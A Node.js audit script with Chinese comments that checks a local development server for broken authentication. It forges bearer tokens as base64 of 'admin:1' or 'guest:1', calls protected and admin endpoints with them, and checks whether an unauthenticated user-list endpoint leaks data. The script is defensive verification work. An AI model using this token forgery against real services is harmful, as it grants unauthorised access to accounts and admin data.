/**
 * 安全复核：验证 token 是否可伪造、免认证接口暴露了什么。
 * 仅对本机开发服务发起只读请求，用于确认问题存在（不修改任何数据）。
 * 用法: node scripts/audit-auth.js
 */
const BASE = process.env.CHECK_BASE || 'http://127.0.0.1:9871';

async function probe(label, path, headers = {}) {
  try {
    const res = await fetch(`${BASE}${path}`, { headers });
    const text = await res.text();
    console.log(`${String(res.status).padStart(3)}  ${label}`);
    console.log(`     ${text.slice(0, 160).replace(/\s+/g, ' ')}`);
    return { status: res.status, text };
  } catch (e) {
    console.log(`ERR  ${label} :: ${e.message}`);
    return { status: 0, text: '' };
  }
}

/** 伪造 token：只用「存在的用户名 + 假时间戳」，不经过登录 */
function forgeToken(userName) {
  return Buffer.from(`${userName}:1`).toString('base64');
}

async function main() {
  console.log('=== 1. 无 token 访问受保护接口 ===');
  await probe('GET /api/rooms（无 token）', '/api/rooms');

  console.log('\n=== 2. 用伪造 token 访问受保护接口（未登录、未验证密码）===');
  const forged = forgeToken('admin');
  console.log(`     伪造 token = base64("admin:1") = ${forged}`);
  const r = await probe('GET /api/rooms（伪造 admin token）', '/api/rooms', {
    Authorization: `Bearer ${forged}`
  });
  if (r.status === 200) {
    console.log('     ⚠️  伪造 token 通过了认证 —— 无需密码即可访问全部受保护接口');
  }

  console.log('\n=== 3. 伪造 guest 账号 token 访问管理员接口 ===');
  const guest = forgeToken('guest');
  await probe('GET /api/overview（伪造 guest token）', '/api/overview', {
    Authorization: `Bearer ${guest}`
  });

  console.log('\n=== 4. 免认证接口是否泄露信息 ===');
  await probe('GET /api/user/list（无 token，代码里被放行）', '/api/user/list');

  console.log('\n=== 5. token 是否可随意篡改用户名 ===');
  const upper = Buffer.from('ADMIN:1').toString('base64');
  await probe('GET /api/rooms（token=base64("ADMIN:1")）', '/api/rooms', {
    Authorization: `Bearer ${upper}`
  });
}

main().catch((e) => {
  console.error('审计失败:', e.message);
  process.exitCode = 1;
});
